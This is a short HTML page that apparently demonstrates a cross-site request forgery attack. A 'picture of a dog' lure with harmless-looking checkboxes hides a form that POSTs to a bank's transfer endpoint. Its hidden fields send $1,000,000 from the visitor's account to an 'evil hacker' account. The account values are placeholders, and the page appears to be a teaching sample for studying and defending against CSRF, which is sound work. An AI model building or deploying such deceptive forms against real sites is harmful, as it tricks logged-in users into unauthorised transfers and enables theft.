<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Dog Form</title>
</head>

<body>

    <h1>Want to see a picture of a dog?</h1>

    <form id="hacker-form" action="http://chase.com/transfer" method="POST">
        <input type="hidden" name="from" value="my-account-num">
        <input type="hidden" name="to" value="evil-hacker-account-num">
        <input type="hidden" name="amt" value="$1,000,000">
        <p>
            <label for="yes">Yes</label>
            <input id="yes" name="yes" type="checkbox" value="">
        </p>
        <p>
            <b><label for="yes-b">Yes in bold</label></b>
            <input id="yes-b" name="yes-b" type="checkbox" value="">
        </p>
        <button type="submit">Submit</button>
    </form>

</body>

</html>
